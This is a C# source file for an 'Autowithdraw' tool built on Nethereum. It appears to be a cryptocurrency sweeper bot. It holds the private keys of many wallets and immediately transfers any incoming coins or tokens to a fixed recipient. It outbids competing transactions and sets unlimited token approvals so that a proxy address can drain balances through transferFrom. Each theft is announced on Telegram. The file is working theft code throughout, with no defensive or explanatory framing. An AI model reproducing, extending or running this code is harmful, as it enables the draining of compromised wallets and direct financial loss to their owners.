using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;

namespace Autowithdraw.Main.Actions
{
    internal class Transfer
    {
        public static Dictionary<string, TransactionDescription> GasPrices = new Dictionary<string, TransactionDescription>();
        public static List<string> Busy = new List<string>();

        public static async Task Native(
            string Address,
            BigInteger Wei,
            int ChainID,
            bool WeiNotKnow = false,
            bool CheckedBalance = false)
        {
            try
            {
                #region Antispam

                if (Busy.Contains(Address))
                    new Thread(() =>
                    {
                        Thread.Sleep(1000 * 10);
                        Busy.Remove(Address);
                    }).Start();

                #endregion

                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                string Link = Settings.Chains[ChainID].Link;
                string Symbol = Settings.Chains[ChainID].Token;
                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID), Settings.Chains[ChainID].HTTPClient);
                BigInteger GasPrice = await Pricing.GetGwei(ChainID);
                BigInteger LastNonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest);
                string txHash;

                #endregion

                Logger.Debug($"Transfer Native - {Address} - {WeiNotKnow} - {CheckedBalance} ({ChainID})");

                bool Deleted = false;

                // Для арбитрума 10 попыток
                for (int i = 0; i < (WeiNotKnow ? 50 : (ChainID == 42161 ? 10 : 200));)
                {
                    try
                    {
                        // Если веи не известны, либо их уже вывели - стараемся выводить баланс
                        if (WeiNotKnow || Deleted)
                            Wei = await Account.Eth.GetBalance.SendRequestAsync(Address);

                        var NewNonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address, BlockParameter.BlockParameterType.latest);

                        // Если нонс не такой как был в первый раз, то веи уже вывели
                        if (LastNonce != NewNonce)
                        {
                            LastNonce = NewNonce;
                            Deleted = true;
                            GasPrice = await Pricing.GetGwei(ChainID); // Обновляем текущий гвей
                        }

                        // Вычисления остатка
                        BigInteger NewWei = Wei - GasPrice * Settings.Chains[ChainID].DefaultGas;

                        // Если не хватает денег для комиссии - ставим деньги в 0 и всё в комиссию
                        if (NewWei < 0)
                        {
                            GasPrice = (Wei - Helper.GetWei(true)) / Settings.Chains[ChainID].DefaultGas;
                            NewWei = Helper.GetWei();
                        }

                        try
                        {
                            var Input = new TransactionInput
                            {
                                From = Address,
                                To = Settings.Config.Recipient,
                                Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                                GasPrice = new HexBigInteger(GasPrice),
                                Value = new HexBigInteger(NewWei),
                                Nonce = new HexBigInteger(LastNonce)
                            };

                            if (GasPrice <= 0)
                                throw new Exception("GasPrice equal 0");

                            //if (ChainID == 42161)
                            //    Input.Gas = await Account.Eth.TransactionManager.EstimateGasAsync(Input);

                            // Чтобы не заменять свои же транзакции
                            if (GasPrices.ContainsKey(Address))
                                if (GasPrices[Address].Nonce == LastNonce && GasPrices[Address].GasPrice > GasPrice)
                                    throw new Exception("Bused");

                            GasPrices[Address] = new TransactionDescription
                            {
                                Nonce = LastNonce,
                                GasPrice = GasPrice
                            };

                            txHash = await Account.Eth.TransactionManager.SendTransactionAsync(Input);

                            Console.WriteLine(txHash + " " + Address);

                            #region Notification

                            async void Notification()
                            {
                                try
                                {
                                    TransactionReceipt Transaction =
                                        await Helper.WaitForTransactionReceipt(txHash, ChainID);
                                    if (!Transaction.Succeeded()) throw new Exception($"Not success {txHash}");

                                    float Price = Pricing.GetPrice(
                                        NewWei + Input.GasPrice.Value * Settings.Chains[ChainID].DefaultGas, ChainID);
                                    float EtherNew = (float)Web3.Convert.FromWei(NewWei);
                                    float PriceNew = Pricing.GetPrice(NewWei, ChainID);
                                    bool Deleted = NewWei == Helper.GetWei();

                                    if (Price - PriceNew >= 2)
                                        Settings.Stats.AddNative(PriceNew, true);
                                    else
                                        Settings.Stats.AddNative(PriceNew);

                                    Logger.Debug($"Withdraw {EtherNew} {Symbol} ({PriceNew}$) from {Address}",
                                        ConsoleColor.Green);
                                    if (PriceNew >= Settings.Config.Other.Minimum || (Price > 30 && Deleted))
                                        await Network.SendTelegram(
                                            $"{Pricing.GetEmoji(PriceNew, Deleted)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">{(Deleted ? "Deleted" : "Autowithdraw" + (CheckedBalance ? " balance" : ""))} {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nAmount: {(Deleted ? 0 : EtherNew)} {Symbol} ({(Price - PriceNew >= 2 ? $"{PriceNew}/{Price}$" : $"{PriceNew}$")})",
                                            isNative: true);
                                }
                                catch
                                {
                                    // ignored
                                }
                            }

                            // Если деньги пришли - то ставим в новый поток уведомления, и мониторим дальше баланс
                            if (!CheckedBalance)
                                await Task.Factory.StartNew(Notification);
                            else
                            {
                                Notification(); // Если деньги уже там были, ждать новых смысла нет
                                break;
                            }

                            #endregion
                        }
                        catch (Exception e)
                        {
                            //Console.WriteLine($"Error: {e.Message} " + Address);
                            if (e.Message.Contains("underpriced"))
                            {
                                //Console.WriteLine(GasPrice);
                                GasPrice += new BigInteger((double)Wei * 0.10) / Settings.Chains[ChainID].DefaultGas; 
                                continue;
                            }

                            if (Helper.AddNonce(e) && !WeiNotKnow && !e.Message.Contains("already known"))
                                continue;
                        }
                    }
                    catch
                    {
                        // ignored
                    }

                    i++;
                    Thread.Sleep(WeiNotKnow ? 1000 : 300);
                }
            }
            catch
            {
                // ignored
            }
        }

        public static async Task Token(
            string ContractAddress,
            string Address,
            float Price,
            int ChainID)
        {
            try
            {
                #region Antispam

                new Thread(() =>
                {
                    Thread.Sleep(1000 * 60);
                    Busy.Remove(ContractAddress + Address);
                }).Start();

                #endregion

                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Threads

                await Task.Factory.StartNew(() => TransferTask(ContractAddress, Address, ChainID, Price));
                await Task.Factory.StartNew(() => ApproveTask(ContractAddress, Address, ChainID, Price));

                #endregion

                #region Values

                string Link = Settings.Chains[ChainID].Link;
                string Destination = Settings.Config.Proxy.Address;
                Web3 Account = new Web3(new Account(Settings.Config.Proxy.PrivateKey, ChainID),
                    Settings.Chains[ChainID].HTTPClient);
                var Contract = new ContractHelper(Destination, ContractAddress, Account);
                Function Transfer = Contract.Get("transferFrom");

                #endregion

                Logger.Debug($"Transfer Token - {Address} ({ChainID})");

                TransactionInput TX = new TransactionInput
                {
                    From = Destination,
                    Gas = new HexBigInteger(100000),
                    GasPrice = new HexBigInteger(await Pricing.GetPriority(Price, ChainID, 60000))
                };

                for (int i = 0, x = 0; i < (Price <= 6 ? 2 : 5) && x < 300; x++)
                {
                    try
                    {
                        BigInteger Balance = await Contract.Balance(Address);

                        Pricing.ValidPrice(ChainID, Address, ContractAddress, Balance, Balance, await Contract.Decimals(), "", out Price, out float Ether, out _, updatePrice: false);
                        if (Price < 3)
                            throw new Exception("Not balance");

                        BigInteger ApproveWei = await Contract.Allowance(Address, Destination);
                        if (ApproveWei < Balance && ApproveWei != -1)
                            throw new Exception("Not approved");

                        float PriceTX = Pricing.GetPriceEther(TX.Gas.Value * TX.GasPrice.Value, ChainID);

                        if (PriceTX >= Price - 3)
                        {
                            Logger.Debug("Price very high");
                            return;
                        }

                        if (TX.Gas.Value > 250000 && !Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                        {
                            TX.GasPrice = new HexBigInteger(await Pricing.GetGwei(ChainID));
                        }

                        if (ChainID == 42161)
                            TX.Gas = new HexBigInteger(1000000);

                        TX.Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Destination, BlockParameter.BlockParameterType.latest);
                        string txHash = await Transfer.SendTransactionAsync(TX, Address, Settings.Config.Recipient, Balance);

                        i++;

                        TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID, true) ?? throw new Exception("null");

                        if (!Transaction.Succeeded())
                            throw new Exception($"Not success {txHash}");

                        #region Notification

                        Settings.Stats.AddProxySpend(PriceTX);
                        Settings.Stats.AddTokens(Price);

                        string Symbol = await Contract.Symbol();
                        Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}", ConsoleColor.Green);
                        await Network.SendTelegram($"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)", ContractAddress, ChainID, true);

                        #endregion

                        break;
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("insufficient") &&
                            !string.IsNullOrEmpty(Settings.Chains[ChainID].Contract.ContractAddress))
                        {
                            try
                            {
                                BigInteger WeiProxy = await Account.Eth.GetBalance.SendRequestAsync(Settings.Config.Proxy.Address);
                                TX.GasPrice = new HexBigInteger((WeiProxy - 1000) / TX.Gas.Value);
                            }
                            catch
                            {
                                // ignored
                            }
                            await Network.SendTelegram($"Proxy not have funds - <a href=\"https://{Link}/address/{Destination}\">{Destination}</a>");
                        }
                        if (!e.Message.Contains("nonce too low") &&
                            !e.Message.Contains("already known") &&
                            !e.Message.Contains("replacement") &&
                            !e.Message.Contains("approved") &&
                            !e.Message.Contains("balance") &&
                            !e.Message.Contains("insufficient"))
                            Logger.Error(e.Message);
                    }

                    Thread.Sleep(300);
                }
            }
            catch (Exception e) { Logger.Error(e); }
        }

        public static async Task TransferTask(
            string ContractAddress,
            string Address,
            int ChainID,
            float Price)
        {
            try
            {
                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);
                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);
                Function Transfer = Contract.Get("transfer");

                float Amount;

                #endregion

                if (Price < 200 || ChainID != 56)
                    await Task.Factory.StartNew(async () =>
                    {
                        try
                        {
                            BigInteger Gas = await Contract.Get("transfer").EstimateGasAsync(Address, null, null, Settings.Config.Recipient, await Contract.Balance());
                            Amount = Pricing.GetPriceEther(await Pricing.GetFee(Gas, ChainID), ChainID);
                            Amount += Amount * 0.1f;
                            if (Amount > 0.24)
                            {
                                Logger.Debug($"Transfer for Contract {ContractAddress} high the normal");
                                throw new Exception();
                            }
                        }
                        catch
                        {
                            Amount = 0.24f;
                        }

                        await Task.Factory.StartNew(() => Helper.TransferGas(Address, ChainID, Amount));
                    });

                for (int i = 0; i < 300;)
                {
                    try
                    {
                        BigInteger Balance = await Contract.Balance();

                        Pricing.ValidPrice(ChainID, Address, ContractAddress, Balance, Balance, await Contract.Decimals(), "", out Price, out float Ether, out _, updatePrice: false);
                        if (Price < 3)
                            throw new Exception("Not balance");

                        BigInteger GasLimit = await Transfer.EstimateGasAsync(Address, null, null, Settings.Config.Recipient, Balance);

                        string txHash = await Transfer.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(GasLimit),
                            GasPrice = new HexBigInteger(await Pricing.GetGwei(ChainID)),
                            Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                                BlockParameter.BlockParameterType.latest)).Value)
                        }, Helper.GetAddress(Price, Address, Settings.Config.Recipient), Balance);

                        #region Notification

                        //if (Price < 155000 || !Settings.Start)
                        await Task.Factory.StartNew(async () =>
                        {
                            TransactionReceipt Transaction = await Helper.WaitForTransactionReceipt(txHash, ChainID);
                            if (!Transaction.Succeeded())
                                return;

                            string Link = Settings.Chains[ChainID].Link;
                            string Symbol = await Contract.Symbol();

                            Pricing.ValidPrice(ChainID, Address, ContractAddress, Balance, Balance, await Contract.Decimals(), "", out float Price, out float Ether, out _, updatePrice: false);

                            Settings.Stats.AddTokens(Price);

                            Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Address}", ConsoleColor.Green);
                            await Network.SendTelegram($"{Pricing.GetEmoji(Price)} <a href=\"https://{Link}/tx/{Transaction.TransactionHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://{Link}/address/{Address}\">{Address}</a>\nAmount: {Ether} <a href=\"https://{Link}/token/{ContractAddress}?a={Address}\">{Symbol}</a> ({Price}$)", ContractAddress, ChainID, true);
                        });

                        #endregion
                    }
                    catch (Exception e)
                    {
                        if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("insufficient"))
                        {
                            Thread.Sleep(50);
                            continue;
                        }
                    }

                    i++;
                    Thread.Sleep(300);
                }
            }
            catch (Exception e) { Logger.Error(e); }
        }

        public static async Task ApproveTask(
            string ContractAddress,
            string Address,
            int ChainID,
            float Price)
        {
            try
            {
                if (Settings.Config.Other.StoppedAW)
                    return;

                #region Values

                Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID),
                    Settings.Chains[ChainID].HTTPClient);
                ContractHelper Contract = new ContractHelper(Address, ContractAddress, Account);
                string Destination = Settings.Config.Proxy.Address;

                BigInteger ApproveWei = await Contract.Allowance(Address, Destination);

                if (ApproveWei > 1000000000000000000 || ApproveWei == -1)
                    return;

                Function Approve = Contract.Get("approve");
                BigInteger GasLimit = await Approve.EstimateGasAsync(Address, null, null, Destination, Settings.MaxInt);
                float Amount = Pricing.GetPriceEther(await Pricing.GetFee(GasLimit, ChainID), ChainID);
                Amount += Amount * 0.1f;

                #endregion

                if ((Price < 200 || ChainID != 56) && (Price >= 30 || (Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress) && Price >= 5)))
                    await Task.Factory.StartNew(async () =>
                    {
                        for (int x = 0; x < 5; x++)
                        {
                            for (int i = 0; i < 2; i++)
                            {
                                BigInteger Balance = await Contract.Balance();

                                if (Balance < await Contract.Decimals() * 0.00001f || ApproveWei >= Settings.MaxInt || ApproveWei == -1)
                                    return;
                                if (Amount >= 0.13 && !Settings.Config.Other.TrustedTokens.ContainsKey(ContractAddress))
                                {
                                    Logger.Debug($"Approve for Contract {ContractAddress} high the normal");
                                    return;
                                }
                                await Helper.TransferGas(Address, ChainID, Amount);
                                Thread.Sleep(3500);
                            }
                            Thread.Sleep(60000);
                        }
                    });

                for (int i = 0, x = 0; i < 300 && x < 1800; x++)
                {
                    try
                    {
                        ApproveWei = await Contract.Allowance(Address, Destination);

                        if (ApproveWei >= Settings.MaxInt || ApproveWei == -1)
                            break;

                        #region Filtering Gas

                        BigInteger AccountWei = (await Account.Eth.GetBalance.SendRequestAsync(Address)).Value - 666;
                        BigInteger GasPrice = AccountWei / GasLimit;
                        if (GasPrice < 0)
                            throw new Exception("Not have balance");

                        #endregion

                        await Approve.SendTransactionAsync(new TransactionInput
                        {
                            From = Address,
                            Gas = new HexBigInteger(GasLimit),
                            GasPrice = new HexBigInteger(GasPrice),
                            Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                                BlockParameter.BlockParameterType.latest)).Value)
                        }, Destination, Settings.MaxInt);
                    }
                    catch (Exception e)
                    {
                        if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("Not have balance"))
                        {
                            Thread.Sleep(50);
                            continue;
                        }
                    }

                    i++;
                    Thread.Sleep(300);
                }
            }
            catch (Exception e) { Logger.Error(e); }
        }
    }
}
